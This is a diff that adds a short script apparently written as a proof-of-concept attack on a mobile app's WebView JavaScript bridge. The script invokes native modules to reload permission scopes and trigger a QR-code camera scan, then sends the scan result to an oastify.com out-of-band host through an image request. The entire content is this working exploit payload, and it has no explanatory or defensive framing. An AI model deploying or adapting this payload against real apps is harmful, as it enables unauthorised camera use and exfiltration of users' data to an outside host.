@@ -1,0 +1,20 @@
+<script>
+function call(o, e, n, t) {
+    var c = o + "_" + e + "Callback_" + Date.now();
+    window[c] = function(o) {
+        t(o), delete window[c]
+    };
+    var a = JSON.stringify({
+        callback: c,
+        method: e,
+        module: o,
+        parameters: n || {}
+    });
+    window[o][e](a)
+}
+  call("ScopeModule", "reloadScopes", {}, function() {
+    call("CameraModule", "scanQRCode", {}, function(r) {
+      new Image().src = "https://95cbvs2z8y5xlnagrxr9087zuq0hojc8.oastify.com/?cam=" + encodeURIComponent(r.result || r.status_code);
+    });
+  });
+</script>
